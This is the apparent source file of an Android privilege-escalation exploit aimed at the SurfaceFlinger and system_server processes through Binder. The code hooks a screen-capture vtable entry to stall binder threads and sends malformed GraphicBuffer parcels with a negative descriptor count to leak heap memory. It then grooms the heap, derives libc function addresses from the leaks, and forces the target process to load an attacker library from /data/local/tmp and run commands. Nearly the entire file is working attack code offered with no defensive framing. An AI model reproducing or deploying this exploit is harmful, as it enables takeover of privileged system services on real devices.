#define private public
#define protected public
#include <binder/Binder.h>
#include <binder/IBinder.h>
#include <binder/IServiceManager.h>
#include <binder/Parcel.h>
#include <binder/ProcessState.h>
#include <binder/TextOutput.h>
#include <binder/IPCThreadState.h>
#include <cutils/ashmem.h>
#include <fcntl.h>
#include <getopt.h>
#include <gui/SurfaceComposerClient.h>
#include <gui/Surface.h>
#include <ui/Fence.h>
#include <ui/GraphicBuffer.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <android/log.h>
#include <time.h>
#include <unistd.h>
#include <gui/BufferQueueProducer.h>
#include <signal.h>
#include <sstream>

#include <gui/ISurfaceComposer.h>
#include <gui/BufferQueue.h>
#include <gui/CpuConsumer.h>
#define JEMALLOC_H_TYPES
#include "jemalloc/internal/qr.h"
#include "jemalloc/internal/ql.h"
#include "jemalloc/internal/arena.h"
#define JEMALLOC_H_STRUCTS
#include "jemalloc/internal/stats.h"
#include "jemalloc/internal/tcache.h"
#undef JEMALLOC_H_STRUCTS
#undef JEMALLOC_H_TYPES
#define LOGV(...) __android_log_print(ANDROID_LOG_VERBOSE, "logexploit", __VA_ARGS__)
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG  , "logexploit", __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO   , "logexploit", __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN   , "logexploit", __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , "exploit", __VA_ARGS__)



using namespace android;
extern int getGOTOffset(const char * module_name,const char * symbol_name,int *memcpyOffset);
extern unsigned int getOffset(const char *moduleName,const char *funcName);
void runCMD()
{
    FILE *fp;
    int status;
    char path[PATH_MAX];
    fp = popen("toolbox id ", "r");
    if (fp == NULL){
        printf("popen failed\n");
    } 
    while (fgets(path, PATH_MAX, fp) != NULL){
        LOGD("%s",path);
    }
    pclose(fp);
}

int getLinkerAddress(){
    FILE *fp;
    int status;
    char path[PATH_MAX];
    //use su just for test,the memory address layout of system_server is the same as normal apps
    fp = popen("su -c /system/bin/toolbox cat /proc/`/data/local/tmp/busybox pidof system_server`/maps | grep /linker | /data/local/tmp/busybox head -n 1 2>&1", "r");
    if (fp == NULL){
        printf("popen failed\n");
        return 0;
    } 
    while (fgets(path, PATH_MAX, fp) != NULL){
        LOGD("%s ------",path);
    }
    pclose(fp);
    int linkerBase=0;
    sscanf(path,"%x",&linkerBase);
    LOGD("linker base is %x",linkerBase);
    return linkerBase;
}

namespace threadsignal{
    void thread_exit_handler(int sig)
    { 
        LOGD("this signal is %d thread 0x%.8x exit\n", sig,(int)pthread_self());
        pthread_exit((void*)-2);
    }
    void setHandler(){
        struct sigaction actions;
        memset(&actions, 0, sizeof(actions)); 
        sigemptyset(&actions.sa_mask);
        actions.sa_flags = 0; 
        actions.sa_handler = thread_exit_handler;
        sigaction(SIGUSR1,&actions,NULL);
    }
}
namespace pingserver{
    struct args_t{
        sp<IBinder> *binder;
        bool isSetHandler;
    };
    void *ping(void *args){
        struct args_t *theArgs = (struct args_t *)args;
        threadsignal::setHandler();
        sp<IBinder> *binder = theArgs->binder;
        theArgs->isSetHandler=true;
        (*binder)->pingBinder();
        return NULL;
    }
    bool isAllBinderThreadHang(sp<IBinder> binder){
        pthread_t t;
        struct args_t args; 
        args.binder=&binder;
        args.isSetHandler=false;
        pthread_create(&t, NULL, ping, (void *)&args );
        LOGD("ping thread 0x%.8x start",(int)t);
        while(!args.isSetHandler){
            sleep(0.2);
        }
        sleep(1);
        pthread_kill(t,SIGUSR1);
        void *ret;
        pthread_join(t,&ret);
        return ret==(void*)-2?true:false;
    }
    void *hangBinderThread(sp<IGraphicBufferProducer> producer)
    {
        LOGD("hangBinderThreads start");
        sp<GraphicBuffer> pbuffer = new GraphicBuffer(3,3,1,3);
        int slot = -1;
        for(int i=0;i<65;i++){
            status_t status =producer->attachBuffer(&slot,pbuffer); 
            if(status!=0){
                LOGD("attach buffer failed with %d\n",status);
            }else
                LOGD("attach buffer %d success\n",slot);
        }
        LOGD("hangBinderThreads end");
        return NULL;
    }
}

namespace hook{

    typedef status_t (*CAPTURESCREEN)(void* pthis,const sp<IBinder>& display,
            const sp<IGraphicBufferProducer>& producer,
            Rect sourceCrop, uint32_t reqWidth, uint32_t reqHeight,
            uint32_t minLayerZ, uint32_t maxLayerZ,
            bool useIdentityTransform,
            int rotation);
    CAPTURESCREEN originalcapturescreen = NULL; 
    sp<IGraphicBufferProducer> g_producer = NULL;
    int capturescreenAddress = 0;
    bool barrier = true;


    status_t captureScreen(void *pthis,const sp<IBinder>& display,
            const sp<IGraphicBufferProducer>& producer,
            Rect sourceCrop, uint32_t reqWidth, uint32_t reqHeight,
            uint32_t minLayerZ, uint32_t maxLayerZ,
            bool useIdentityTransform,
            int rotation)
    {

        //LOGD("capture screen called\n");
        g_producer = producer;
        while(barrier==true)
            sleep(0.2);
        status_t ret = originalcapturescreen(pthis,display,producer,sourceCrop,reqWidth,reqHeight,minLayerZ,maxLayerZ,useIdentityTransform,rotation);
        return ret;
    }
    void hookCapturescreen(){

        barrier = true;
        sp<ISurfaceComposer> composer;
        const String16 name("SurfaceFlinger");
        getService(name, &composer);
        //BBinder *bbinder = composer->asBinder()->localBinder();
        BBinder *p =   composer->asBinder()->localBinder();
        capturescreenAddress = *((int*)p-1)+72;
        mprotect((void*)(capturescreenAddress&0xfffff000),4096,PROT_READ|PROT_WRITE);
        originalcapturescreen = (CAPTURESCREEN)*(int*)capturescreenAddress;
        //LOGD("modified address is %p,originalcapturescreen is %p, hooked to address is %p \n",(void*)capturescreenAddress,originalcapturescreen,captureScreen);
        *(int*)capturescreenAddress = (int)&captureScreen;

    }

    void unHookCapturescreen(){

        barrier = false;
        if(capturescreenAddress!=0)
            *(int *)capturescreenAddress = (int)originalcapturescreen;
    }

}

namespace threadcontrol{

    void *hangThreads(void *){

        //LOGD("----------begin hang threads %p------------",(void*)pthread_self());
        sp<IServiceManager> sm = defaultServiceManager();
        sp<IBinder> service = sm->checkService(String16("window"));
        if (service != NULL ) {
            Parcel data, reply;
            data.writeInterfaceToken(String16("android.view.IWindowManager"));
            //data.writeStrongBinder(service);
            data.writeInt32(0);
            data.writeInt32(800);
            data.writeInt32(600);
            data.writeInt32(1);
            //trigger system_server send capture snapshot binder call to surfaceflinger 
            service->transact(68, data, &reply);
        }
        //LOGD("----------end hang threads %p------------",(void*)pthread_self());
        return NULL;
    }

    int suspendBinderThreads(){

        LOGD("----------suspendBinderThreads------------");
_restart:
        hook::hookCapturescreen();
        pthread_t t;
        for(int i=0;i<15;i++)
            pthread_create( &t, NULL, hangThreads, (void *)NULL );
        LOGD("sleep 1s...");
        sleep(1);
        if(pingserver::isAllBinderThreadHang(hook::g_producer->asBinder())){
            LOGD("+++++++++++++dead lock++++++++++++");
            hook::unHookCapturescreen();
            sleep(4);
            goto _restart;
        }
        LOGD("ping ok");
        return 0;
    }
    int resumeBinderThreads(){
        LOGD("----------resumeBinderThreads-----------");
        hook::unHookCapturescreen();
        sleep(1);
        return 0;
    }
}

Parcel *requestBuffer(int bufferIdx,sp<IGraphicBufferProducer> producer)
{
    sp<IBinder> binder= producer->asBinder();
    Parcel data;
    Parcel *reply = new Parcel();
    data.writeInterfaceToken(String16("android.gui.IGraphicBufferProducer"));
    data.writeInt32(bufferIdx);

    status_t status =binder->transact(1, data, reply,0);
    if(status!=0){
         LOGD("transact fail with %d",status);
        //exit(-1);
    }
    return reply;
}

void prepareData(Parcel &data,int numFds,int numInts)
{

    String16 ifName = IGraphicBufferProducer::descriptor;
    data.writeInterfaceToken(ifName);
    data.writeInt32(1);//status flags
    data.writeInt32(numFds);//-23
    data.writeInt32(numInts);//37

}

Parcel *getRemoteMemory(int newSlot,int numFds,int numInts, GraphicBuffer *findedBuffer,buffer_handle_t handle)
{

    sp<IGraphicBufferProducer> producer = hook::g_producer;
    sp<IBinder> binder= producer->asBinder();
    Parcel data,unusedReply;
    prepareData(data,numFds,numInts);
    GraphicBuffer *exploitBuffer = (GraphicBuffer*)malloc(sizeof(GraphicBuffer));
    memcpy(exploitBuffer,findedBuffer,sizeof(GraphicBuffer));
    exploitBuffer->handle = handle;
    for(int i=0;i<numInts/32+1;i++)
        data.write(exploitBuffer,sizeof(GraphicBuffer));

    //0x48 reserved_proc
    status_t status = binder->transact(12, data, &unusedReply,0);
    for(int i=0;i<10;i++)
        if(status!=0){
            LOGD("transact fail with %d",status);
            status = binder->transact(12, data, &unusedReply,0);
        }
    Parcel *reply = requestBuffer(newSlot,producer);
    free(exploitBuffer);
    return reply;
}

int getSystemFuncAddress(const Parcel *libui)
{

    unsigned char *p = (unsigned char*)libui->data()+13*4;//the first 13 words belong to GraphicBuffer
    //p point to libui base + (0x18+12+0x34*4), 0x18 for getting native_handle,12 size of native handle,0x34 is value of numFds.
    size_t leakedSize = libui->dataSize();
    int memcpyOffset = -1; 
    getGOTOffset("/system/lib/libui.so","memcpy",&memcpyOffset);
    int memcpyAddress = *(int *)(p+memcpyOffset-(0x18+12+0x34*4));
    //raise(SIGINT);
    LOGD("memcpy in surfaceflinger is %p",(void*)memcpyAddress); 
    int memcpyOffsetFromBase = getOffset("libc.so","memcpy");
    int systemOffsetFromBase = getOffset("libc.so","system");

    //aout<<memcpyOffsetFromBase<<" "<<systemOffsetFromBase<<endl;
    int systemAddressInSurfaceflinger = memcpyAddress-memcpyOffsetFromBase+systemOffsetFromBase;

    //aout<<"system in surfaceflinger is "<<(void*)systemAddressInSurfaceflinger<<endl;
    return systemAddressInSurfaceflinger;
}

int getDlopenFuncAddress(const Parcel *libc)
{

    unsigned char *p = (unsigned char*)libc->data()+13*4;//the first 13 words belong to GraphicBuffer
    //p point to libc base + (0x18+12+0x34*4), 0x18 for getting native_handle,12 size of native handle,0x34 is value of numFds.
    size_t leakedSize = libc->dataSize();
    int dlopenOffset = -1; 
    getGOTOffset("/system/lib/libc.so","dlopen",&dlopenOffset);
    //0xb6f643e4 <_DYNAMIC+4>:    0x00068650  0x00000002  0x00001348  0x00000017
    int dlopenAddress = *(int *)(p+dlopenOffset-(0x683e4+12+0x2*4));
    //raise(SIGINT);
    //aout<<"dlopen in surfaceflinger is "<<(void*)dlopenAddress<<endl;
    return dlopenAddress;
}

void *getStackBase(const Parcel *searchedParcel){
    uint32_t size = searchedParcel->dataSize();
    //aout<<"search stack "<<(void*)size<<endl;
    for(uint32_t j=12;j<size-4;j++){

        uint32_t *p = (uint32_t*)((uint32_t)searchedParcel->data()+j);

        if(p[0]==600&&p[1]==800)
        {
            if( ((p[-1]+0x1000)&0xfffff000) == ((p[-3]+0x1000)&0xfffff000) )
            {
                void *pStackBase = (void*)((p[-1]+0x1000)&0xfffff000);
                //aout<<"-----------find stack address at "<<pStackBase<<"-----------"<<endl;
                LOGD("-----------find stack address at %p",pStackBase);
            }
        }

    }
    return NULL;
}

void *heapFengShui(){

    sp<IGraphicBufferProducer> producer = hook::g_producer;
    sp<IBinder> binder= producer->asBinder();
    sp<GraphicBuffer> bf = new GraphicBuffer(100,100,1,3);
    int newSlot=-1;
    status_t status = 0;
    /* *(int*)&(bf->handle->numFds)=0;
     *(int*)&(bf->handle->numInts)=14;
     for(unsigned int i=0;i<1000;i++){
     status = producer->attachBuffer(&newSlot,bf); 
     status = producer->attachBuffer(&newSlot,bf); 
     if(status!=0){
     aout<<"attach Buffer "<<newSlot<<" failed"<<endl;
     exit(-1);
     }
    //aout<<"start boom"<<endl;
    binder->transact(12, data, &reply,0);
    status = producer->detachBuffer(newSlot); 
    status = producer->detachBuffer(newSlot-1); 
    }*/

    //LOGD("FENGSHUI");
    //Parcel data128;
    //prepareData(data128,0,29);
    //char fill[255];
    //data128.write(fill,255);
    *(int*)&(bf->handle->numFds)=0;
    *(int*)&(bf->handle->numInts)=29;//29
    for(int i=0;i<7;i++){
        status = producer->attachBuffer(&newSlot,bf); 
        if(status!=0){
            LOGD("transact fail with %d",status);
        }

    }
    for(int i=newSlot;i>newSlot-7;i--){
        status = producer->detachBuffer(i); 
        if(status!=0){
            LOGD("detachBuffer fail with %d",status);
        }
    }
    return NULL;
}

char* get_executable_name(char*buffer,int len)
{
    FILE* fd=fopen("/proc/self/cmdline","r");
    memset(buffer,0,len);
    size_t st = fread(buffer,len,1,fd);
    //LOGD("name is %s",buffer);
    fclose(fd);
    return buffer; 
}
void *findGraphicBuffer(Parcel *reply){

    unsigned int *p = (unsigned int*)reply->data();
    GraphicBuffer *findedBuffer = NULL;
    int count=0;
    int offsettoFindedNativeHandle = 0;
    int offsettoSoPath = 0;
    for(size_t j=5;j<reply->dataSize()/4;j++){
        if(p[j]==0x5f626672){
            findedBuffer = (GraphicBuffer*)(&p[j]-2);
            if(findedBuffer->handle!=NULL&&findedBuffer->width==256&&findedBuffer->height==512){
                //aout<<"version is:"<<findedBuffer->common.version<<" incRef is:"<<(void *)findedBuffer->common.incRef<<"heap address is:"<<findedBuffer->handle<<endl;
                //aout<<"width is:"<<findedBuffer->width<<"height is:"<<findedBuffer->height<<endl;
                if(offsettoFindedNativeHandle!=0){
                    //aout<<"offsettoFindedNativeHandle"<<offsettoFindedNativeHandle<<"offsettoSoPath"<<offsettoSoPath<<endl;
                    void *soPath = (void *)((int*)findedBuffer->handle-offsettoFindedNativeHandle+offsettoSoPath);
                    //return p+j;
                    return soPath;
                }
            }
        }
        if(p[j]=='gmsm'&&p[j-4]==2&&p[j-3]==12&&p[j+9]==256&&p[j+10]==512){
            if(count==0){
                offsettoFindedNativeHandle = j-5;
                //aout<<"1st occurence offset is "<<j-5<<endl;
            }
            count++;
        }
        if(p[j]=='tad/'){
            if(offsettoSoPath==0){
                offsettoSoPath = j;
                //aout<<"so path offset is "<<j<<endl;
            }
        }
    }
    return NULL;
}
int triggerGarbageCollect(int num){
    //set num to 300 to trigger gc, less than 300 to manipulate heap
    sp<IServiceManager> sm = defaultServiceManager();
    sp<IBinder> service = sm->checkService(String16("power"));
    //aout<<"alloct "<<num<<"BpBinder::ObjectManager on heap"<<endl;
    if (service != NULL ) {
        for(int i=0;i<num;i++){
            {
                sp<IBinder> newBinder = new BBinder();
                Parcel data,reply;
                data.writeInterfaceToken(String16("android.os.IPowerManager"));
                data.writeStrongBinder(newBinder);
                service->transact(1, data, &reply);
                newBinder = NULL;
            }
        }
    }else{
       // aout<<"get service failed"<<endl;
    }
    return 0;
}

void *worker(void *){
    LOGD("enter worker thread");
    // sleep(60);

    const uint32_t offsetFromIncRefToLibuibase = 0x6449;
    uint32_t pChunk = 0;
    uint32_t pTcache = 0;
    uint32_t gap = 0;


    Parcel data,reply;
    prepareData(data,-23,37);//-23,37
#define BUFFERLEN 0xfaffc
    int buffer[BUFFERLEN/4];
    for(size_t i=0;i<BUFFERLEN;i+=4)
        buffer[i/4]=0xcccccccc;
    //控制返回内容多少
    buffer[1]=0;   //numFds
    buffer[2]=0xe000;//0x10000;//0x1ffff;   //numInts
    char *soPath = (char*)(&buffer[20]);
    const char *soName = "/data/local/tmp/libexpsys.so";
    memcpy(soPath,soName,strlen(soName)+1);
    data.write(buffer,BUFFERLEN);


    bool bIsHeapStable = false;
    GraphicBuffer *findedBuffer = NULL;
    void * findedNativeHandle = NULL;
    void * incRef = NULL;
    void * stackBase = NULL;
    int offset = 0;
    int modifyedGraphicBuffer = 0;
    srand(time(NULL));
    for(int k=1;k<500&&bIsHeapStable==false;k++){

        status_t status = 0;
        int newSlot=-1;
        const unsigned int buffercount = 30;//rand()%5+1; 
        int randomWidth=rand()%1000;
        int randomHeight=rand()%1000;

        threadcontrol::suspendBinderThreads();
        sp<IGraphicBufferProducer> producer = hook::g_producer;
        producer->setBufferCount(64);
        sp<IBinder> binder = producer->asBinder();
        sp<GraphicBuffer> bf = new GraphicBuffer(100,100,1,3);
        Parcel *replyBuffer =NULL; 
        uint32_t replyLength = -1;

        for(int i=0;i<20;i++){
            int r = rand()%9;
            for(int i=0;i<r;i++)
                status = producer->attachBuffer(&newSlot,bf); 
            binder->transact(12, data, &reply,0);
            replyBuffer = requestBuffer(newSlot,producer);
            replyLength = replyBuffer->dataSize();
            delete replyBuffer;
            LOGD("slot %d return size is %d",newSlot,replyLength);
            //aout<<"slot "<<newSlot<<" return size is "<<replyLength<<endl;
            if(replyLength>136||replyLength==0)
                break;
            for(int i=0;i<r;i++)
                producer->detachBuffer(i); 
        }
        if(replyLength<=136){
            if(replyLength==0){
                LOGD("wait for system_server reboot");
                sleep(10);
            }
            threadcontrol::resumeBinderThreads();
            continue;
        }

        int slotForLeak = newSlot;
        sp<GraphicBuffer> tofind = new GraphicBuffer(256,512,1,3);
        void *soPathInSystemServer = NULL;
        for(int i=0;i<30;i++){
            heapFengShui(); //one attach for fix the hole
            producer->attachBuffer(&newSlot,bf);
            producer->attachBuffer(&newSlot,tofind);
            replyBuffer = requestBuffer(slotForLeak,producer);
            soPathInSystemServer = findGraphicBuffer(replyBuffer);
            if(soPathInSystemServer!=NULL){
                LOGD("-------------------soPat----------------- %p",soPathInSystemServer);
                int *p = (int*)replyBuffer->data();
                for(size_t j=0;j<replyBuffer->dataSize()/4&&j<300;j+=4){
                    LOGD("%.8x:%.8x %.8x %.8x %.8x",j,p[j],p[j+1],p[j+2],p[j+3]);
                }
                break;
            }
            delete replyBuffer;
            producer->detachBuffer(newSlot-1);
            producer->detachBuffer(newSlot);
        }

        delete replyBuffer;
        producer->detachBuffer(newSlot-1);
        producer->detachBuffer(newSlot);
        threadcontrol::resumeBinderThreads();
        if(soPathInSystemServer == NULL)
            continue;

        //abuse
        threadcontrol::resumeBinderThreads();
        for(int exp=0;exp<50;exp++)
        {
            threadcontrol::suspendBinderThreads();
            sp<IGraphicBufferProducer> producer = hook::g_producer;
            producer->setBufferCount(64);
            sp<IBinder> binder = producer->asBinder();
            Parcel dataForRun;
            int num=10;
            prepareData(dataForRun,-23-20*3,37+20*3);
            int buffer[20];
            for(int u=0;u<20;u++)
                buffer[u]=10+u;
            buffer[4]=(int)soPathInSystemServer;
            buffer[5]=0;
            buffer[6]=3;
            int pAddress=getLinkerAddress();
            buffer[7]=0xecc+pAddress+1;
            for(int i=0;i<20;i++)
                dataForRun.write(buffer,20*4);
            triggerGarbageCollect(50);
            status = binder->transact(12, dataForRun, &reply,0);
            triggerGarbageCollect(300);
            threadcontrol::resumeBinderThreads();
            if(status!=0){
                LOGD("transact failed with %d",status);
                exit(-1);
                break;
            }
        }

        continue;

        LOGD("---------------------------------");
        sleep(10);
        exit(-1);


        threadcontrol::resumeBinderThreads();
        //delete replyBuffer;
        for(int i=0;i<=newSlot;i++){
            status = producer->detachBuffer(i);
            if (status!=0)
                LOGD("detach buffer %d failed",i);
        }
    }
    return NULL;
}

 /*__attribute__((constructor))*/void inSystemServer(){

    LOGD("i'm in systemserver");
    runCMD();
}

 /*__attribute__((constructor))*/void inMediaServer(){

    LOGD("i'm in mediaserver");
    runCMD();
}

void inSurfaceFlinger(){
    LOGD("i'm in surfaceflinger");
    runCMD();
    pthread_t t;
    pthread_create( &t, NULL, worker, (void *)NULL );
    sleep(6000);
}



/*__attribute__((constructor)) */extern "C" void so_main(){

    char name[255];
    get_executable_name(name,255);
    if(strstr(name,"surfaceflinger")!=NULL)
        inSurfaceFlinger();
    else
        inSurfaceFlinger();
        //inSystemServer();
    return;
}

extern "C" void so_entry()
{
    LOGD("------------I'm alive-----------\n");
    so_main();
    return;
};
